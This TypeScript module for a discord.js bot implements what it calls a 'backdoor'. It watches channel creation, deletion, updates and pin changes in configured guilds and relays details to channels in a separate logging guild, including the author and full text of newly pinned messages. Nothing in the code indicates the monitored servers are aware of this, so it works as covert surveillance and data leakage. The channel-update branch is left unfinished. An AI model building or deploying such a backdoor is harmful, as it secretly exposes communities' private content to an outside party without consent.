import { Client, GuildBasedChannel, GuildChannel } from "discord.js";
import { Events } from "discord.js";
import { SterlingEmbed } from "../models";
import { HexCodes } from "../util";
import { ChannelType } from "discord.js";
import { TextBasedChannel } from "discord.js";

export default async function runBackdoor(client: Client, event: Events, args: any[]): Promise<boolean> {
	const backdoors = client.settings.get('backdoorMode') as Map<string, string>;
	const loggingInfo = client.settings.get('backdoorLogging');
	let loggingGuild = await client.guilds.fetch(loggingInfo.guildId);
	let targetChannel: GuildBasedChannel | null;

	const embed = SterlingEmbed.barebones();
	embed
		.setColor(HexCodes.Blue)

	if (event === Events.ChannelCreate) {
		let arg_0_channel = args[0] as GuildChannel;
		let targetChannelId = backdoors.get(arg_0_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		embed
			.setTitle('Channel Created')
			.setDescription(`A channel was created in "${arg_0_channel.guild.name}"`)
			.addFields(
				{ name: 'Name', value: `#${arg_0_channel.name}`, inline: true },
				{ name: 'Category', value: `${arg_0_channel.parent?.name}`, inline: true },
				{ name: 'Type', value: `${arg_0_channel.type.toString()}`, inline: true },
				{ name: 'Link', value: `${arg_0_channel.url}`, inline: true },
			);
	} else if (event === Events.ChannelDelete) {
		let arg_0_channel = args[0] as GuildChannel;
		let targetChannelId = backdoors.get(arg_0_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		embed
			.setTitle('Channel Deleted')
			.setDescription(`A channel was deleted in "${arg_0_channel.guild.name}"`)
			.addFields(
				{ name: 'Name', value: `#${arg_0_channel.name}`, inline: true },
				{ name: 'Category', value: `${arg_0_channel.parent?.name}`, inline: true },
				{ name: 'Type', value: `${arg_0_channel.type.toString()}`, inline: true },
			);
	} else if (event === Events.ChannelPinsUpdate) {
		let arg_0_channel = args[0] as TextBasedChannel;
		if (arg_0_channel.type === ChannelType.DM) return false;
		let targetChannelId = backdoors.get(arg_0_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		let pins = await arg_0_channel.messages.fetchPinned();

		let lastPin = pins.last();
		let desc = lastPin ? `
Pins in channel #${arg_0_channel.name} (${arg_0_channel.parent?.name}) were altered.

**Last Pinned Message:**

Author: ${lastPin.author.username}#${lastPin.author.discriminator}
Embeds: ${lastPin.embeds.length}
Content:
\`\`\`
${lastPin.content}
\`\`\`
		`.trim() : `All pins in channel #${arg_0_channel.name} (${arg_0_channel.parent?.name}) were removed.`;

		embed
			.setTitle('Channel Pins Updated')
			.setDescription(desc);
	} else if (event === Events.ChannelUpdate) {
		let arg_0_channel = args[0] as GuildChannel;
		let arg_1_channel = args[1] as GuildChannel;
		let targetChannelId = backdoors.get(arg_1_channel.guildId);
		if (!targetChannelId) return false;
		targetChannel = await loggingGuild.channels.fetch(targetChannelId);
		if (!targetChannel || targetChannel.type !== ChannelType.GuildText) return false;

		let changes = [];

		// redo this part to make more common checks like name not be repeated
		if (arg_0_channel.type === ChannelType.GuildAnnouncement && arg_1_channel.type === ChannelType.GuildAnnouncement) {
			if (arg_0_channel.name !== arg_1_channel.name) {
				changes.push({
					propName: 'Name',
					old: `#${arg_0_channel.name}`,
					new: `#${arg_1_channel.name}`
				});
			}
		}
	} else {
		return false;
	}

	targetChannel.send({
		embeds: [embed.export()]
	});

	return true;
}